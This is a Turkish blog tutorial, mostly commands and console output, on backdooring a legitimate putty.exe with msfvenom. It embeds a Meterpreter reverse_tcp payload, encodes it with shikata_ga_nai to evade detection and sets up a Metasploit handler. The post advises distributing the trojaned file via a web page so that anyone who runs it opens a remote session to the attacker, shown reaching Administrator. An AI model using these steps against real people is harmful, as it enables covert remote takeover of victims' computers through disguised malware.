---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-16T14:00:00Z"
excerpt: Bir hedef bilgisayara yönelik olarak özel bir .exe dosyası oluşturmak ve
  içine kodlar gömmek gerçekten uzun zaman alabilir. Bunun yerine, zaten var olan
  bir .exe uzantılı dosyanın içine, Metasploit Payload modülleri yerleştirebilirsiniz.
guid: https://www.siberoloji.com/?p=1221
id: 1221
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF EXE Arka Kapısı
url: /tr/msf-exe-arka-kapisi/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="bir-exe-dosyası-i̇le-arka-kapı-oluşturma">Bir EXE Dosyası İle Arka Kapı Oluşturma 
<!-- /wp:heading -->

  Bir hedef bilgisayara yönelik olarak özel bir .exe dosyası oluşturmak ve içine kodlar gömmek gerçekten uzun zaman alabilir. Bunun yerine, zaten var olan bir .exe uzantılı dosyanın içine, Metasploit Payload modülleri yerleştirebilirsiniz.</p>
 

  Bu yazıda, bir .exe dosyasının içine, Metasploit Payload yerleştirip encode etmeyi göreceğiz. Bu sayede, kodlanmış özel .exe dosyasını çalıştıran kullanıcının bilgisayarından bizim bilgisayarımıza Meterpreter oturum açılacaktır.</p>
 

 
<h2 class="wp-block-heading" id="exe-dosyası-i̇ndirme">Exe Dosyası İndirme</h2>
<!-- /wp:heading -->

  Örneğimizde,&nbsp;<code>putty.exe</code>&nbsp;isimli dosyayı kullanacağız. Öncelikle bu dosyayı indirelim. Encode edilmiş .exe dosyamızı web sayfasından dağıtacağımıza göre, Kali Linux içinde sunucumuzun bulunduğu&nbsp;<code>/var/www/</code>&nbsp;klasörüne gidelim ve indirmeyi aşağıdaki komut ile başlatalım.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:/var/www# wget <a href="http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe">http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</a>
--2015-07-21 12:01:27--  <a href="http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe">http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</a>

Resolving the.earth.li <strong>(</strong>the.earth.li<strong>)</strong>... 46.43.34.31, 2001:41c8:10:b1f:c0ff:ee:15:900d
Connecting to the.earth.li <strong>(</strong>the.earth.li<strong>)</strong>|46.43.34.31|:80... connected.
HTTP request sent, awaiting response... 302 Found
Location: <a href="http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe">http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe</a> <strong>[</strong>following]
--2015-07-21 12:01:27--  <a href="http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe">http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe</a>
Reusing existing connection to the.earth.li:80.
HTTP request sent, awaiting response... 200 OK
Length: 524288 <strong>(</strong>512K<strong>)</strong> <strong>[</strong>application/x-msdos-program]
Saving to: `putty.exe'

100%[=========================================================================================================&gt;] 524,288      815K/s   in 0.6s    

2015-07-21 12:01:28 (815 KB/s) - `putty.exe' saved <strong>[</strong>524288/524288]

root@kali:/var/www#
</code></pre>
<!-- /wp:code -->

  Şimdi, bu indirdiğimiz&nbsp;<code>putty.exe</code>&nbsp;dosyasının içine,&nbsp;<code>msfvenom</code>&nbsp;komutunu kullanarak bir Metasploit Payload modülünü yerleştireceğiz. Yerleştireceğimiz modül,&nbsp;<code>windows/meterpreter/reverse_tcp</code>&nbsp;modülüdür ve LHOST olarak kendi IP adresimiz olan 192.168.1.101 IP adresini ayarlayacağız.</p>
 

  Next, we use msfvenom to inject a meterpreter reverse payload into our executable and encoded it 3 times using shikata_ga_nai and save the backdoored file into our web root directory.</p>
 

  root@kali:/var/www# msfvenom -a x86 –platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe -o puttyX.exe</p>
 

  Found 1 compatible encoders Attempting to encode payload with 3 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 326 (iteration=0) x86/shikata_ga_nai succeeded with size 353 (iteration=1) x86/shikata_ga_nai succeeded with size 380 (iteration=2) x86/shikata_ga_nai chosen with final size 380 Payload size: 380 bytes Saved as: puttyX.exe root@kali:/var/www#</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">
İşlem başarıyla sonuçlandığında elimizde ```puttyX.exe``` isimli kodlanmış ve içine payload yerleştirilmiş bir çalıştırılabilir dosya bulunmaktadır.

.exe dosyasının içine, reverse payload yerleştirildiğine göre, bu payload bizim yerel bilgisayarımıza bağlanmak isteyecektir. O zaman, ```msfconsole``` içerisinde bir dinleyici modül çalıştırmalıyız ki bağlantı mümkün olsun.

Bunun için ```exploit/multi/handler``` modülünü kullanalım ve gerekli ayarları yapalım.

```sh
msf &gt; use exploit/multi/handler 

msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp 
PAYLOAD =&gt; windows/meterpreter/reverse_tcp

msf exploit(handler) &gt; set LHOST 192.168.1.101
LHOST =&gt; 192.168.1.101

msf exploit(handler) &gt; set LPORT 443
LPORT =&gt; 443

msf exploit(handler) &gt; exploit

[*] Started reverse handler on 192.168.1.101:443 
[*] Starting the payload handler...
</code></pre>
<!-- /wp:code -->

  Artık dinleme modülü de çalışmaktadır. Bu aşamadan sonra yapılması gereken, oluşturduğumuz .exe dosyasını web üzerinden dağıtmaktır. Herhangi bir kullanıcı bu dosyayı çalıştırdığında, otomatik olarak yerel bilgisayarımıza bağlanacak ve Meterpreter oturumu açılacaktır.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"><strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>749056 bytes<strong>)</strong> to 192.168.1.201
<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 1 opened <strong>(</strong>192.168.1.101:443 -&gt; 192.168.1.201:1189<strong>)</strong> at Sat Feb 05 08:54:25 -0700 2011

meterpreter <strong>&gt;</strong> getuid
Server username: XEN-XP-SPLOIT\Administrator
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

  Bu yazıda anlatılan işlemler ve .exe dosyasının dağıtılması, göründüğünden daha uzun süre alabilir. Burada sadece işlemin mantığı açıklanmaya çalışılmıştır.</p>
 